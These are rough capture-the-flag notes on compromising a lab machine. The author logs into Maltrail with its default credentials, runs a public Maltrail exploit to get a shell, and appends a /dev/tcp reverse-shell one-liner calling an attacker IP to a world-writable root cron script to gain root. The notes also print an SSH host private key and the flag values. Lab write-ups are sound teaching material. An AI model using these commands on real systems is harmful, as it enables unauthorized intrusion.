# CTF-200-01 (rough notes)

Initial port scan:

```
┌──(kali㉿kali)-[~/offsec/ctf-200-01]
└─$ nmap -v -Pn -p- -T4 ctf-200-01       
...

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8338/tcp open  unknown
```

Service version fingerprinting:

```
┌──(kali㉿kali)-[~/offsec/ctf-200-01]
└─$ nmap -v -Pn -p 22,80,8338 -A ctf-200-01
...

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8338/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Maltrail/0.52
|     Date: Sun, 10 Mar 2024 18:30:53 GMT
|     Connection: close
|     Content-Type: text/html
|     Last-Modified: Sat, 31 Dec 2022 22:58:57 GMT
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
|     Cache-Control: no-cache
|     Content-Length: 7091
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="text/html;charset=utf8">
|     <meta name="viewport" content="width=device-width, user-scalable=no">
|     <meta name="robots" content="noindex, nofollow">
|     <title>Maltrail</title>
|     <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
|     <link rel="stylesheet" type="text/css" hre
|   HTTPOptions: 
|     HTTP/1.0 501 Unsupported method ('OPTIONS')
|     Server: Maltrail/0.52
|     Date: Sun, 10 Mar 2024 18:30:53 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
```

Checking out the webservers on 80 and 8338 in the browser:

![](./assets/80-webserver-root.png)

![](./assets/8338-webserver-root.png)

My money is on this Maltrail server being our access vector.

We look in the web for default credentials:

![](./assets/maltrail-default-creds.png)

Trying them out (`admin:changeme!`) lets us in - Great!

There are no hits on exploitdb for "maltrail", but searching for "maltrail exploit" on google gets us to [a gitrepo](https://github.com/spookier/Maltrail-v0.53-Exploit).

We clone the repo, read the code, and try it out.

I set up my listener on port 80, and run the code:

```
┌──(kali㉿kali)-[~/offsec/ctf-200-01/Maltrail-v0.53-Exploit]
└─$ python3 exploit.py 192.168.45.172 80 http://ctf-200-01:8338             
Running exploit on http://ctf-200-01:8338/login
```

We catch a shell as user `snort`.

```
┌──(kali㉿kali)-[~/offsec/ctf-200-01/Maltrail-v0.53-Exploit]
└─$ nc -lvnp 80                                                             
listening on [any] 80 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.176.32] 36084
$ whoami
whoami
snort
```

We find our first flag where we expect it:

```
$ cd /home/snort
cd /home/snort
$ cat local.txt
cat local.txt
2d8c1bc6c448af023375dede7de7561c
```

## Privilege Escalation

We run LinPEAS... the higher relevancy findings I can see are:

- Kernel exploit probable

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
```

- There is a tarball called `etc_backup.tar` in user `snort`'s home directory

I untar the file and go dumpster diving...

I find a bunch of private keys to try in `${UNTARED_ETC}/ssh`:

```
$ pwd
pwd
/home/snort/etc/ssh
$ ls -la
ls -la
total 560
drwxr-xr-x   4 snort snort   4096 Dec 11 12:27 .
drwxr-xr-x 102 snort snort   4096 Dec 16 14:27 ..
-rw-r--r--   1 snort snort 505426 Feb 25  2022 moduli
-rw-r--r--   1 snort snort   1650 Feb 25  2022 ssh_config
drwxr-xr-x   2 snort snort   4096 Feb 25  2022 ssh_config.d
-rw-r--r--   1 snort snort   3266 Dec 11 12:27 sshd_config
drwxr-xr-x   2 snort snort   4096 Feb 25  2022 sshd_config.d
-rw-r--r--   1 snort snort   3239 Oct 31 04:33 sshd_config.ucf-dist
-rw-------   1 snort snort   1381 Jun 15  2022 ssh_host_dsa_key
-rw-r--r--   1 snort snort    601 Jun 15  2022 ssh_host_dsa_key.pub
-rw-------   1 snort snort    505 Jun 15  2022 ssh_host_ecdsa_key
-rw-r--r--   1 snort snort    173 Jun 15  2022 ssh_host_ecdsa_key.pub
-rw-------   1 snort snort    399 Jun 15  2022 ssh_host_ed25519_key
-rw-r--r--   1 snort snort     93 Jun 15  2022 ssh_host_ed25519_key.pub
-rw-------   1 snort snort   2590 Jun 15  2022 ssh_host_rsa_key
-rw-r--r--   1 snort snort    565 Jun 15  2022 ssh_host_rsa_key.pub
-rw-r--r--   1 snort snort    342 Dec  7  2020 ssh_import_id
```

```
$ cat ssh_host_ed25519_key
cat ssh_host_ed25519_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAXSLOD1mfMmNjkOiZZPOCIXefteTW95dKr6X9ZbN8H2gAAAJATlAZRE5QG
UQAAAAtzc2gtZWQyNTUxOQAAACAXSLOD1mfMmNjkOiZZPOCIXefteTW95dKr6X9ZbN8H2g
AAAEA1ChWLNVBMCX2hkw5T/q4Xi8045SXnoI+Si70uYRQZxhdIs4PWZ8yY2OQ6Jlk84Ihd
5+15Nb3l0qvpf1ls3wfaAAAAC3Jvb3RAdWJ1bnR1AQI=
-----END OPENSSH PRIVATE KEY-----
```

Looking at the SSH config, we won't be able to use these keys anyways.... So this is a dead end.

I run `pspy` (which I had to download to kali from the internet and serve over http for the victim host to fetch and run).

We see some interesting findings:

```
2024/03/10 19:13:01 CMD: UID=0     PID=27727  | /usr/sbin/CRON -f -P 
2024/03/10 19:13:01 CMD: UID=0     PID=27728  | /bin/sh -c /var/backups/etc_Backup.sh 
2024/03/10 19:13:01 CMD: UID=0     PID=27730  | tar -cf /home/snort/etc_backup.tar /etc 
2024/03/10 19:13:01 CMD: UID=0     PID=27729  | /bin/bash /var/backups/etc_Backup.sh 
```

The process that created the backup tar that we found earlier runs frequently...

I wonder if we can modify that `/var/backups/etc_backup.sh` script to get root...

```
snort@ochima:~$ ls -la /var/backups | grep etc
ls -la /var/backups | grep etc
-rwxrwxrwx  1 root root     54 Dec 11 12:27 etc_Backup.sh
```

Yes we can... I'll append a reverse shell to that script

```
snort@ochima:/var/backups$ cat etc_Backup.sh
cat etc_Backup.sh
#! /bin/bash 
tar -cf /home/snort/etc_backup.tar /etc

snort@ochima:/var/backups$ echo '0<&196;exec 196<>/dev/tcp/192.168.45.172/8338; sh <&196 >&196 2>&196' >> etc_Backup.sh

snort@ochima:/var/backups$ cat etc_Backup.sh
cat etc_Backup.sh
#! /bin/bash 
tar -cf /home/snort/etc_backup.tar /etc
0<&196;exec 196<>/dev/tcp/192.168.45.172/8338; sh <&196 >&196 2>&196
```

I set up my local listener on port 8338 (in Kali) and wait... and soon enough we get root!

```
┌──(kali㉿kali)-[~/offsec/ctf-200-01]
└─$ nc -lnvp 8338                        
listening on [any] 8338 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.176.32] 37444
whoami
root
```

We then find our flag where we expect it to be:

```
cat /root/proof.txt
7ce9f4bacb76d5c035660d4588791dcb
```